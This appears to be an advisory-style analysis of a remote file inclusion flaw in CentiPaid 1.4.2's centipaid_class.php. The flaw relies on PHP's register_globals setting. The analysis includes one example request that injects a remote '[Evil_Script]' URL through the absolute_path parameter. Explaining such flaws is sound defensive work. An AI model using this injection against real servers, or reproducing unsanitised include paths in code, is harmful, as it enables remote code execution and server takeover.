Based on the provided content, here's an analysis of the vulnerability:

**Root Cause:**
The vulnerability stems from the lack of sanitization of the `$absolute_path` variable in `centipaid_class.php`. When `register_globals` is enabled in PHP, an attacker can control this variable.

**Weaknesses/Vulnerabilities:**
- **Remote File Inclusion (RFI):** The primary vulnerability is that the application includes a file based on the attacker-controlled `$absolute_path` variable.
- **Lack of Input Sanitization:** The application fails to properly validate or sanitize user-supplied input used in a file inclusion.
- **Reliance on register_globals:**  The vulnerability relies on the deprecated PHP `register_globals` setting being enabled.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By injecting a malicious URL into `$absolute_path`, an attacker can cause the server to execute arbitrary code from a remote location. This allows the attacker to potentially gain full control of the server, compromise the application, or access sensitive data.

**Attack Vectors:**
- **HTTP GET Parameter:** The attacker injects the URL of the malicious script into the `absolute_path` parameter of a GET request to `centipaid_class.php`.
   - Example: `http://www.site.com/[path]/centipaid_class.php?absolute_path=[Evil_Script]`

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
- **Vulnerable Server:** The target server needs to be running CentiPaid version 1.4.2 or earlier, with the PHP `register_globals` setting enabled.
- **Knowledge of vulnerable path**: The attacker needs to know the path to the `centipaid_class.php` file.

**Additional Notes:**
- The exploit relies on the deprecated PHP setting `register_globals`. This setting was disabled by default in later PHP versions and has since been removed. The vulnerability would not work on modern PHP setups unless `register_globals` was enabled.
- The content mentions that this is a different vulnerability vector than OSVDB:31638 which was disputed.
- The exploit was discovered by Kw3[R]Ln from the Romanian Security Team.
- The exploit was published on Milw0rm.com.
